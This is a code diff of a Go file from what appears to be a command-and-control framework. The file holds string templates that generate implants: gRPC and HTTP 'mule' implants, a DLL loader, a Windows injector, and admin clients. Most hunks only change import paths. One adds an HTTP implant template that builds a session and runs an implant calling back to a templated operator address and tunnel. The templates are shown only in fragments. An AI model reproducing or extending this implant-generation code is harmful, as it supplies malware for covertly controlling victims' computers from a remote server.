@@ -3,7 +3,7 @@ package lib
 /*
 package main
 import (
-  "odin/wheagle/server/agent"
+  "github.com/alphamystic/odin/wheagle/server/agent"
 )
 
 func init(){
@@ -13,11 +13,11 @@ func init(){
 func main(){}
 */
 
-var Mule = `
+var GrpcMule = `
   package main
   import (
-    "odin/lib/c2"
-    "odin/wheagle/server/agent"
+    "github.com/alphamystic/odin/lib/c2"
+    "github.com/alphamystic/odin/wheagle/server/agent"
   )
 
   func init(){
@@ -38,13 +38,38 @@ var Mule = `
   func main(){}
   `
 
+var HttpMule = `
+  package main
+  import (
+    "github.com/alphamystic/odin/lib/c2"
+    "github.com/alphamystic/odin/wheagle/server/agent"
+  )
+
+  func init(){
+    session := &c2.Session{
+      ID: "{{.ID}}",
+      MotherShipID:"{{.MotherShipID}}",
+      Expiry: "{{.Expiry}}",
+      Active: true,
+      SessionID:"{{.SessionID}}",
+    }
+    implant := &agent.Implant{
+      Address: "{{.Address}}",
+      TunnelAddress: "{{.TunnelAddress}}",
+      ISession: session,
+    }
+    implant.RunHTTPImplant()
+  }
+  func main(){}
+`
+
 var AdminGRPC = `
 package main
 
 import (
   "fmt"
-  "odin/lib/c2"
-  "odin/wheagle/server/lib"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/wheagle/server/lib"
 )
 
 func main(){
@@ -72,8 +97,8 @@ package main
 
 import (
   "fmt"
-  "odin/lib/c2"
-  "odin/wheagle/server/lib"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/wheagle/server/lib"
 )
 
 func main(){
@@ -100,7 +125,7 @@ func main(){
 var honeyBadger = `
 package main
 import (
-  "odin/lib/core"
+  "github.com/alphamystic/odin/lib/core"
 )
 func init(){
   hb := &core.ImplantWrapper{
@@ -119,8 +144,8 @@ var LinuxBootKit = ``
 var DLLLoaderMinion = `
 package main
 import (
-  "odin/lib/c2"
-  "odin/wheagle/server/agent"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/wheagle/server/agent"
 )
 
 import "C"
@@ -181,7 +206,7 @@ func main()  {
 var WindowsInjector = `
 package main
 import (
-  "odin/lib/penguins/zoo"
+  "github.com/alphamystic/odin/lib/penguins/zoo"
 )
 `
 
@@ -229,8 +254,8 @@ package main
 
 import (
   "fmt"
-  "odin/lib/c2"
-  "odin/wheagle/server/lib"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/wheagle/server/lib"
 )
 import "C"
 //export {{.EntryPoint}}
@@ -279,8 +304,8 @@ func DllInstall() bool {
 // go plugins (add the return values)
 var MinionLib = `package main
 import (
-  "odin/lib/c2"
-  "odin/wheagle/server/agent"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/wheagle/server/agent"
 )
 func {{.EntryPoint}}(){
   session := &c2.Session{
@@ -303,8 +328,8 @@ package main
 
 import (
   "fmt"
-  "odin/lib/c2"
-  "odin/wheagle/server/lib"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/wheagle/server/lib"
 )
 
 func {{.EntryPoint}}(){
@@ -334,7 +359,7 @@ package main
 import (
   "os"
   "fmt"
-  "odin/lib/utils"
+  "github.com/alphamystic/odin/lib/utils"
 )
 
 func init(){
@@ -411,8 +436,8 @@ package main
 
 import (
   "fmt"
-  "odin/lib/c2"
-  "odin/wheagle/server/lib"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/wheagle/server/lib"
 )
 
 func main(){
